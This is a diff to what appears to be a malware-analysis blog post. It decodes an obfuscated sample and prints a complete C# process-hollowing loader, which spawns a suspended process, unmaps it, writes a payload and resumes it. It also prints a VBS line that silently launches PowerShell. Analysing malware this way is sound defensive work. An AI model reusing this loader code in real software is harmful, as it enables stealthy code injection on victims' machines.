@@ -82,7 +82,220 @@ There's then a function referencing decompression, which appears to be Gzip.
 
 The next interesting string is a very long URL-encoded byte array.
 
-We're going to start by taking the last, longest, URL-encoded string, and decoding it to reveal an executable using the following CyberChef recipe:
+I'm going to start with the first byte array, which can be decoded and extracted simply by using a From Decimal and Gunzip operator.
+
+This will reveal the following:
+
+``` powershell
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace Netflix
+{
+    public class Movie
+    {
+        #region "Structs"
+        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
+        private struct ProcessInformation
+        {
+            public readonly IntPtr ProcessHandle;
+            public readonly IntPtr ThreadHandle;
+            public readonly uint ProcessId;
+            private readonly uint ThreadId;
+        }
+        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
+        private struct StartupInformation
+        {
+            public uint Size;
+            private readonly string Reserved1;
+            private readonly string Desktop;
+            private readonly string Title;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
+            private readonly IntPtr Reserved2;
+            private readonly IntPtr StdInput;
+            private readonly IntPtr StdOutput;
+            private readonly IntPtr StdError;
+        }
+        #endregion
+
+        #region "API"
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool SetThreadContext(IntPtr thread, int[] context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool GetThreadContext(IntPtr thread, int[] context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int ZwUnmapViewOfSection(IntPtr process, int baseAddress);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
+            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
+        #endregion
+
+        #region "Delegates"
+        private delegate bool CreateProcess_Delegate(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
+            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
+        private delegate bool GetThreadContext_Delegate(IntPtr thread, int[] context);
+        private delegate bool Wow64GetThreadContext_Delegate(IntPtr thread, int[] context);
+        private delegate bool ReadProcessMemory_Delegate(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
+        private delegate int ZwUnmapViewOfSection_Delegate(IntPtr process, int baseAddress);
+        private delegate int VirtualAllocEx_Delegate(IntPtr handle, int address, int length, int type, int protect);
+        private delegate bool WriteProcessMemory_Delegate(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
+        private delegate uint ResumeThread_Delegate(IntPtr hThread);
+        private delegate bool SetThreadContext_Delegate(IntPtr thread, int[] context);
+        private delegate bool Wow64SetThreadContext_Delegate(IntPtr thread, int[] context);
+        #endregion
+
+        public static void Run(string TargetPath, byte[] Payload)
+        {
+            int i = 0;
+            while (i < 5)
+            {
+                int readWrite = 0x0;
+                StartupInformation si = new StartupInformation();
+                ProcessInformation pi = new ProcessInformation();
+                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
+                try
+                {
+                    CreateProcess_Delegate CreateProc = new CreateProcess_Delegate(CreateProcessA);
+                    if (!CreateProc(TargetPath, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi))
+                    {
+                        throw new Exception();
+                    }
+                    int fileAddress = BitConverter.ToInt32(Payload, 0x3C);
+                    int imageBase = BitConverter.ToInt32(Payload, fileAddress + 0x34);
+                    int[] context = new int[0xB3];
+                    context[0x0] = 0x10002;
+                    if (IntPtr.Size == 0x4)
+                    {
+                        GetThreadContext_Delegate GetThread = new GetThreadContext_Delegate(GetThreadContext);
+                        if (!GetThread(pi.ThreadHandle, context))
+                        {
+                            throw new Exception();
+                        }
+                    }
+                    else
+                    {
+                        Wow64GetThreadContext_Delegate Wow64GetThread = new Wow64GetThreadContext_Delegate(Wow64GetThreadContext);
+                        if (!Wow64GetThread(pi.ThreadHandle, context))
+                        {
+                            throw new Exception();
+                        }
+                    }
+                    int ebx = context[0x29];
+                    int baseAddress = 0x0;
+                    ReadProcessMemory_Delegate ReadProcessMem = new ReadProcessMemory_Delegate(ReadProcessMemory);
+                    if (!ReadProcessMem(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite))
+                    {
+                        throw new Exception();
+                    }
+                    if (imageBase == baseAddress)
+                    {
+                        ZwUnmapViewOfSection_Delegate ZwUnmapView = new ZwUnmapViewOfSection_Delegate(ZwUnmapViewOfSection);
+                        if (ZwUnmapView(pi.ProcessHandle, baseAddress) != 0x0)
+                        {
+                            throw new Exception();
+                        }
+                    }
+                    int sizeOfImage = BitConverter.ToInt32(Payload, fileAddress + 0x50);
+                    int sizeOfHeaders = BitConverter.ToInt32(Payload, fileAddress + 0x54);
+                    bool allowOverride = false;
+                    VirtualAllocEx_Delegate VirtualAlloc = new VirtualAllocEx_Delegate(VirtualAllocEx);
+                    int newImageBase = VirtualAlloc(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);
+                    if (newImageBase == 0x0)
+                    {
+                        throw new Exception();
+                    }
+                    WriteProcessMemory_Delegate WriteProcessMem = new WriteProcessMemory_Delegate(WriteProcessMemory);
+                    if (!WriteProcessMem(pi.ProcessHandle, newImageBase, Payload, sizeOfHeaders, ref readWrite))
+                    {
+                        throw new Exception();
+                    }
+                    int sectionOffset = fileAddress + 0xF8;
+                    short numberOfSections = BitConverter.ToInt16(Payload, fileAddress + 0x6);
+                    for (int I = 0; I < numberOfSections; I++)
+                    {
+                        int virtualAddress = BitConverter.ToInt32(Payload, sectionOffset + 0xC);
+                        int sizeOfRawData = BitConverter.ToInt32(Payload, sectionOffset + 0x10);
+                        int pointerToRawData = BitConverter.ToInt32(Payload, sectionOffset + 0x14);
+                        if (sizeOfRawData != 0x0)
+                        {
+                            byte[] sectionData = new byte[sizeOfRawData];
+                            Buffer.BlockCopy(Payload, pointerToRawData, sectionData, 0x0, sectionData.Length);
+                            if (!WriteProcessMem(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
+                        }
+                        sectionOffset += 0x28;
+                    }
+                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
+                    if (!WriteProcessMem(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite)) throw new Exception();
+                    int addressOfEntryPoint = BitConverter.ToInt32(Payload, fileAddress + 0x28);
+                    if (allowOverride) newImageBase = imageBase;
+                    context[0x2C] = newImageBase + addressOfEntryPoint;
+                    if (IntPtr.Size == 0x4)
+                    {
+                        SetThreadContext_Delegate SetThread = new SetThreadContext_Delegate(SetThreadContext);
+                        if (!SetThread(pi.ThreadHandle, context))
+                        {
+                            throw new Exception();
+                        }
+                    }
+                    else
+                    {
+                        Wow64SetThreadContext_Delegate Wow64SetThread = new Wow64SetThreadContext_Delegate(Wow64SetThreadContext);
+                        if (!Wow64SetThread(pi.ThreadHandle, context))
+                        {
+                            throw new Exception();
+                        }
+                    }
+                    ResumeThread_Delegate ResumeTH = new ResumeThread_Delegate(ResumeThread);
+                    if (ResumeTH(pi.ThreadHandle) == -1)
+                    {
+                        throw new Exception();
+                    }
+                }
+                catch
+                {
+                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
+                    continue;
+                }
+                i++;
+                break;
+            }
+        }
+    }
+}
+``` 
+
+Within this script there are lots of references to injection APIs, indicating this is very likely going to be our loader.
+
+The second array can be simply decoded with a From Decimal operator and reveals the following:
+
+```
+Set Obj = CreateObject("WScript.Shell")
+Obj.Run "PowerShell -ExecutionPolicy RemoteSigned -File " & "%FilePath%", 0
+```
+
+The last, longest, URL-encoded string can be decoded to reveal an executable using the following CyberChef recipe:
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e1c81006-928f-4863-956b-1ff2a84187a2)
 
